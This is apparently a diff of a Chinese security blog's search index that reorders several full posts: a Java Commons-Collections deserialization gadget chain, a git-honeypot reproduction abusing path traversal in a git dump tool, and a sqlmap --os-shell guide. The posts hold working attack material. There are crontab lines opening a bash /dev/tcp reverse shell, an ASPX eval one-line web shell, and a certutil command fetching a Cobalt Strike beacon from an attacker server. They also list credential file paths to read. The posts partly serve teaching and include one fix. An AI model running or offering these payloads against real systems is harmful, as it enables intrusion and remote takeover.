class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), <span class="comment">// 隐藏错误信息</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//使用 LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"><span class="comment">//        tiedMapEntry.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用反射修改 BadAttributeValueExpException 中的 val 为 tiedMapEntry</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(bad, tiedMapEntry);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        // 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(bad);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化读取 out.bin 文件</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p>天下大木头师傅的 <a href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0">https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0</a></p>
 ]]></content>
       <categories>
         <category>漏洞原理</category>
@@ -860,60 +860,6 @@
       </tags>
   </entry>
   <entry>
-    <title>git 蜜罐复现</title>
-    <url>/2021/08/09/git%20%E8%9C%9C%E7%BD%90%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<blockquote>
-<p>  好久不见</p>
-</blockquote>
-<h2 id="0x01-git-蜜罐复现"><a href="#0x01-git-蜜罐复现" class="headerlink" title="0x01 git 蜜罐复现"></a>0x01 git 蜜罐复现</h2><p>具体原理请看 <a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> git</span><br><span class="line"></span><br><span class="line">repo = git.Repo.init(path=<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">repo.index.add(items=[<span class="string">&#x27;../../git_poc.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">repo.index.commit(<span class="string">&#x27;commit&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><code>python3 -m pip install GitPython</code></p>
-<p>python3 运行, 生成Poc </p>
-<blockquote>
-<p>  在当前目录的..&#x2F;..&#x2F;的目录下必须有git_poc.txt</p>
-</blockquote>
-<p>比如当前脚本目录为 <code>/Users/yhy/Desktop/gitpoc</code>,那么在<code>/Users/yhy</code>要存在<code>git_poc.txt</code></p>
-<p>然后将 <strong>.git</strong> 文件夹整体拖入网站根目录下</p>
-<p>效果：防止干扰我直接在虚拟机中运行 <a href="https://github.com/0xHJK/dumpall.git">dumpall</a> 工具</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210809174743.png" alt="image-20210809154939407"></p>
-<p>没有在 <strong>dumpall&#x2F;192.168.100.250_8080</strong> 目录下生成文件，而是进行了<strong>目录穿越</strong>,在原计划（dumpall&#x2F;192.168.100.250_8080）两层外的目录下生成了git_poc</p>
-<h3 id="1-1-计划任务反弹shell"><a href="#1-1-计划任务反弹shell" class="headerlink" title="1.1 计划任务反弹shell"></a>1.1 计划任务反弹shell</h3><p>先在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 下新建名为 root 的反弹shell代码文件。</p>
-<p><code>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.100.250/8888 0&gt;&amp;1</code></p>
-<p>然后将<code>repo.index.add(items=[&#39;../../git_poc.txt&#39;])</code> 中的<code>../../git_poc.txt</code> 替换, 使用多个**..&#x2F;**,确保返回到根目录 </p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">repo.index.add(items=[<span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../../../../var/spool/cron/crontabs/root&#x27;</span>])</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root (centos系列主机)</p>
-<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root (debian系列主机)</p>
-</blockquote>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210809174751.png" alt="image-20210809173416573"></p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210809174728.png" alt="image-20210809173349713"></p>
-<h2 id="0x02-修复"><a href="#0x02-修复" class="headerlink" title="0x02 修复"></a>0x02 修复</h2><p>这就是个目录穿越漏洞，这里简单粗暴的将 <strong>..&#x2F;</strong> 全部删除，以dumpall为例 </p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dumpall/dumper.py</span></span><br><span class="line">filename = <span class="built_in">str</span>(filename).replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..\\&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;/&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;\\&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210809174721.png" alt="image-20210809174123558"></p>
-<h2 id="0x03在ubuntu中反弹shell问题"><a href="#0x03在ubuntu中反弹shell问题" class="headerlink" title="0x03在ubuntu中反弹shell问题"></a>0x03在ubuntu中反弹shell问题</h2><p>有师傅反应说上一篇<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484658&idx=1&sn=84f39840f9a8104edc4fde4c7962fed6&chksm=c2829debf5f514fd40c1abbe73beabe02b2cbe1e190504bb5e060ab445d1cab086c247674fa4&scene=21#wechat_redirect">git 蜜罐复现</a>文章中在ubuntu和kali写入了计划任务，还是不能反弹shell。</p>
-<p>关于这一点我在做实验时，一开始也是没有反弹shell，我手动编辑了几遍root文件，具体弹shell的代码并没有改变，然后就莫名其妙的弹回来了，忙着发文，也就没有再次实验，我的错。</p>
-<p>今天又试了好多次，还是弹不回来，终于找到了原因，这东西就是<strong>ubuntu系统的原因，root文件的权限必须为600</strong>，还有就是弹的代码也有点问题，这是原文链接：</p>
-<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
-<p>shell不能反弹，可以写ssh公钥等，最后他给的弹shell代码<strong>好像</strong>还有点问题，在代码前后空一格，写入换行符</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">*/1 * * * * bash -c <span class="string">&quot;bash -i &gt;&amp;/dev/tcp/xx.xx.xx.xx/8888 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
-<p><a href="https://github.com/0xHJK/dumpall">https://github.com/0xHJK/dumpall</a> </p>
-<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-        <category>蜜罐</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-        <tag>蜜罐</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Windows系统散列值获取</title>
     <url>/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/</url>
     <content><![CDATA[<blockquote>
@@ -998,6 +944,60 @@
       </tags>
   </entry>
   <entry>
+    <title>git 蜜罐复现</title>
+    <url>/2021/08/09/git%20%E8%9C%9C%E7%BD%90%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<blockquote>
+<p>  好久不见</p>
+</blockquote>
+<h2 id="0x01-git-蜜罐复现"><a href="#0x01-git-蜜罐复现" class="headerlink" title="0x01 git 蜜罐复现"></a>0x01 git 蜜罐复现</h2><p>具体原理请看 <a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> git</span><br><span class="line"></span><br><span class="line">repo = git.Repo.init(path=<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">repo.index.add(items=[<span class="string">&#x27;../../git_poc.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">repo.index.commit(<span class="string">&#x27;commit&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>python3 -m pip install GitPython</code></p>
+<p>python3 运行, 生成Poc </p>
+<blockquote>
+<p>  在当前目录的..&#x2F;..&#x2F;的目录下必须有git_poc.txt</p>
+</blockquote>
+<p>比如当前脚本目录为 <code>/Users/yhy/Desktop/gitpoc</code>,那么在<code>/Users/yhy</code>要存在<code>git_poc.txt</code></p>
+<p>然后将 <strong>.git</strong> 文件夹整体拖入网站根目录下</p>
+<p>效果：防止干扰我直接在虚拟机中运行 <a href="https://github.com/0xHJK/dumpall.git">dumpall</a> 工具</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210809174743.png" alt="image-20210809154939407"></p>
+<p>没有在 <strong>dumpall&#x2F;192.168.100.250_8080</strong> 目录下生成文件，而是进行了<strong>目录穿越</strong>,在原计划（dumpall&#x2F;192.168.100.250_8080）两层外的目录下生成了git_poc</p>
+<h3 id="1-1-计划任务反弹shell"><a href="#1-1-计划任务反弹shell" class="headerlink" title="1.1 计划任务反弹shell"></a>1.1 计划任务反弹shell</h3><p>先在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 下新建名为 root 的反弹shell代码文件。</p>
+<p><code>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.100.250/8888 0&gt;&amp;1</code></p>
+<p>然后将<code>repo.index.add(items=[&#39;../../git_poc.txt&#39;])</code> 中的<code>../../git_poc.txt</code> 替换, 使用多个**..&#x2F;**,确保返回到根目录 </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">repo.index.add(items=[<span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../../../../var/spool/cron/crontabs/root&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root (centos系列主机)</p>
+<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root (debian系列主机)</p>
+</blockquote>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210809174751.png" alt="image-20210809173416573"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210809174728.png" alt="image-20210809173349713"></p>
+<h2 id="0x02-修复"><a href="#0x02-修复" class="headerlink" title="0x02 修复"></a>0x02 修复</h2><p>这就是个目录穿越漏洞，这里简单粗暴的将 <strong>..&#x2F;</strong> 全部删除，以dumpall为例 </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dumpall/dumper.py</span></span><br><span class="line">filename = <span class="built_in">str</span>(filename).replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..\\&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;/&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;\\&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210809174721.png" alt="image-20210809174123558"></p>
+<h2 id="0x03在ubuntu中反弹shell问题"><a href="#0x03在ubuntu中反弹shell问题" class="headerlink" title="0x03在ubuntu中反弹shell问题"></a>0x03在ubuntu中反弹shell问题</h2><p>有师傅反应说上一篇<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484658&idx=1&sn=84f39840f9a8104edc4fde4c7962fed6&chksm=c2829debf5f514fd40c1abbe73beabe02b2cbe1e190504bb5e060ab445d1cab086c247674fa4&scene=21#wechat_redirect">git 蜜罐复现</a>文章中在ubuntu和kali写入了计划任务，还是不能反弹shell。</p>
+<p>关于这一点我在做实验时，一开始也是没有反弹shell，我手动编辑了几遍root文件，具体弹shell的代码并没有改变，然后就莫名其妙的弹回来了，忙着发文，也就没有再次实验，我的错。</p>
+<p>今天又试了好多次，还是弹不回来，终于找到了原因，这东西就是<strong>ubuntu系统的原因，root文件的权限必须为600</strong>，还有就是弹的代码也有点问题，这是原文链接：</p>
+<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
+<p>shell不能反弹，可以写ssh公钥等，最后他给的弹shell代码<strong>好像</strong>还有点问题，在代码前后空一格，写入换行符</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">*/1 * * * * bash -c <span class="string">&quot;bash -i &gt;&amp;/dev/tcp/xx.xx.xx.xx/8888 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
+<p><a href="https://github.com/0xHJK/dumpall">https://github.com/0xHJK/dumpall</a> </p>
+<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+        <category>蜜罐</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+        <tag>蜜罐</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>gitHub_cve_monitor</title>
     <url>/2021/02/25/github_cve_monitor/</url>
     <content><![CDATA[<blockquote>
@@ -1031,6 +1031,97 @@
       </categories>
       <tags>
         <tag>GitHub工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqlmap关于os-shell小记</title>
+    <url>/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="SqlMap-–os-shell-利用"><a href="#SqlMap-–os-shell-利用" class="headerlink" title="SqlMap –os-shell 利用"></a>SqlMap –os-shell 利用</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol>
+<li><p>拥有dba权限</p>
+</li>
+<li><p>网站的绝对路径</p>
+</li>
+<li><p>高版本的mysql需要 <code>show variables like &#39;%secure_file_priv%&#39;</code> 或者<code>select </code></p>
+<p> <code>@@secure;</code>或者<code>show global variables like &#39;%secure%&#39;;</code>的结果符合要求，secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。这个参数只能通过修改配置文件后重启mysql修改</p>
+<ul>
+<li>如果该变量为空，则变量无效，这时候最容易利用</li>
+<li>如果变量为目录的绝对路径，则服务器会将导入和导出操作限制为仅适用于该目录中的文件</li>
+<li>如果设置为NULL，则服务器禁用导入和导出操作。</li>
+</ul>
+</li>
+<li><p>当为php时，magic_quotes_gpc为off，php主动转义的功能关闭**</p>
+</li>
+</ol>
+<p>当执行 –os-shell时，这个时候sqlmap主要做了三件事情：</p>
+<ol>
+<li>进行目标的一个基础信息的探测。</li>
+<li>上传shell到目标web网站上（sqlmap会自动生成两个文件，一个用于命令执行，一个用于上传文件）</li>
+<li>退出时删除shell。</li>
+</ol>
+<h3 id="寻找绝对路径"><a href="#寻找绝对路径" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h3><ol>
+<li><p>通过网站报错信息查看绝对路径</p>
+</li>
+<li><p>通过搜索引擎获取</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">google语法：site:baidu.com warning</span><br><span class="line">site:baidu.com  &quot;fatal error&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置文件获取路径<br> 如果注入点有文件读取权限，就可以通过load_file函数读取配置文件，再从中寻找路径信息。</p>
+</li>
+</ol>
+<p>  Sqlmap 下可以使用–sql-shell 获取一个sql命令执行窗口，使用load_file(‘文件名’)读取文件</p>
+<p>  也可以使用 –file-read&#x3D;文件名 ，读取文件</p>
+<p>sqlmap -u ‘url’ –batch –file-read&#x3D;&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</p>
+<ul>
+<li><p><strong>win 下常见的敏感文件</strong></p>
+<p><a href="https://link.zhihu.com/?target=https://blog.csdn.net/hardhard123/article/details/80062733">常用的绝对路径收集</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:/boot.ini //查看系统版本 </span><br><span class="line">c:/windows/php.ini //php配置信息 </span><br><span class="line">c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 </span><br><span class="line">c:/winnt/php.ini </span><br><span class="line">c:/winnt/my.ini </span><br><span class="line">c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码 </span><br><span class="line">c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码 </span><br><span class="line">c:\Program Files\Serv-U\ServUDaemon.ini </span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置 </span><br><span class="line">c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码 </span><br><span class="line">c:\Program Files\Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此 </span><br><span class="line">c:\Program Files\RhinoSoft.com\ServUDaemon.exe </span><br><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件 </span><br><span class="line">//存储了pcAnywhere的登陆密码 </span><br><span class="line">c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件 </span><br><span class="line">c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息. </span><br><span class="line">c:/Resin/conf/resin.conf/usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机 </span><br><span class="line">d:\APACHE\Apache2\conf\httpd.conf </span><br><span class="line">C:\Program Files\mysql\my.ini </span><br><span class="line">C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</span><br><span class="line">c:\windows\php.ini      php配置文件</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml    IIS虚拟主机配置文件</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Linux 下常见的敏感文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件 </span><br><span class="line">/usr/local/apache2/conf/httpd.conf </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 </span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关设置 </span><br><span class="line">/etc/sysconfig/iptables //从中得到防火墙规则策略 </span><br><span class="line">/etc/httpd/conf/httpd.conf // apache配置文件 </span><br><span class="line">/etc/rsyncd.conf //同步程序配置文件 </span><br><span class="line">/etc/my.cnf //mysql的配置文件 </span><br><span class="line">/etc/redhat-release //系统版本 </span><br><span class="line">/etc/issue </span><br><span class="line">/etc/issue.net </span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关设置 </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 </span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 </span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上 </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 </span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件 </span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 </span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上 </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 </span><br><span class="line">/etc/sysconfig/iptables 查看防火墙策略 </span><br><span class="line">load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录 </span><br><span class="line">replace(load_file(0×2F6574632F706173737764),0×3c,0×20) </span><br><span class="line">replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</span><br><span class="line">etc/php.ini          php配置文件</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf        Apache配置文件</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/apache/conf/extra/httpd-vhosts.conf  虚拟目录配置文件</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>通过执行</strong><code>select @@datadir;</code> 获取数据库数据保存的位置、 <code>select @@basedir;</code> 安装位置、<code>select @@plugin_dir</code> mysql plugin目录</p>
+<p>可能会有一些关键信息，然后对关键信息搜索，查找默认路径</p>
+</li>
+</ul>
+<p>	</p>
+<h3 id="执行–os-shell"><a href="#执行–os-shell" class="headerlink" title="执行–os-shell"></a>执行–os-shell</h3><p>成功后会在网站绝对路径下，生成两个文件，一个可以上传，一个可以执行命令。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106105940.png"></p>
+<h2 id="SqlServer"><a href="#SqlServer" class="headerlink" title="SqlServer"></a>SqlServer</h2><h3 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h3><ul>
+<li>数据库支持外连</li>
+<li>数据库权限为SA权限</li>
+</ul>
+<p>Sqlserver –os-shell主要是利用<code>xp_cmdshell</code>扩展进行命令执行。</p>
+<p>当执行–os-shell 时，这个时候sqlmap主要做了三件事情：</p>
+<ol>
+<li>识别当前数据库类型，然后打印出来。</li>
+<li>检测是否为数据库dba，也就是查看是否为sa权限。</li>
+<li>检测是否开启了xp_cmdshell，如果没有开启sqlmap就会尝试开启。</li>
+</ol>
+<h3 id="寻找绝对路径-1"><a href="#寻找绝对路径-1" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h3><p>可以上传一个复杂文件名的文件，比如：l12asd3123_0sads7_08.jpg</p>
+<p>或者在网站中找到一个复杂的文件名，觉得会是唯一的，通过命令查找</p>
+<p>sqlmap  –os-shell 下使用，以下任意一条命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /r e:\ %i in (1*.php) do @echo %i  *必加</span><br><span class="line">dir c:\ d:\  /s /b | find &quot;icon_assignment.gif&quot;</span><br></pre></td></tr></table></figure>
+
+<p>查找文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110036.png"></p>
+<h3 id="上一句话马或者连cs"><a href="#上一句话马或者连cs" class="headerlink" title="上一句话马或者连cs"></a>上一句话马或者连cs</h3><h4 id="写一句话木马"><a href="#写一句话木马" class="headerlink" title="写一句话木马"></a>写一句话木马</h4><p><code> echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;weshe11b&quot;],&quot;unsafe&quot;);%^&gt; &gt; d:\wwwroot\1azq.aspx</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110059.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110119.png"></p>
+<h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>使用 <code>certutil.exe -urlcache -split -f http://vpsIP:port/beacon32.exe a32.exe</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110147.png"></p>
+<p>a32.exe 执行， 有时执行不成功饭是因为权限不够，可以下载到有执行权限的目录（假如c:&#x2F;temp&#x2F; ，有权限，<code>certutil.exe -urlcache -split -f http://vpsIP:port/beacon32.exe c:/temp/a32.exe </code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110212.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在有拥有dba权限后，</p>
+<ul>
+<li>mysql拿shell的难点在于寻找绝对路径</li>
+<li>sqlserver在于xp_cmdshell 是否开启。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>安全工具</category>
+      </categories>
+      <tags>
+        <tag>sqlmap使用</tag>
+        <tag>getshell</tag>
       </tags>
   </entry>
   <entry>
@@ -1230,97 +1321,6 @@
       </categories>
       <tags>
         <tag>Web渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqlmap关于os-shell小记</title>
-    <url>/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/</url>
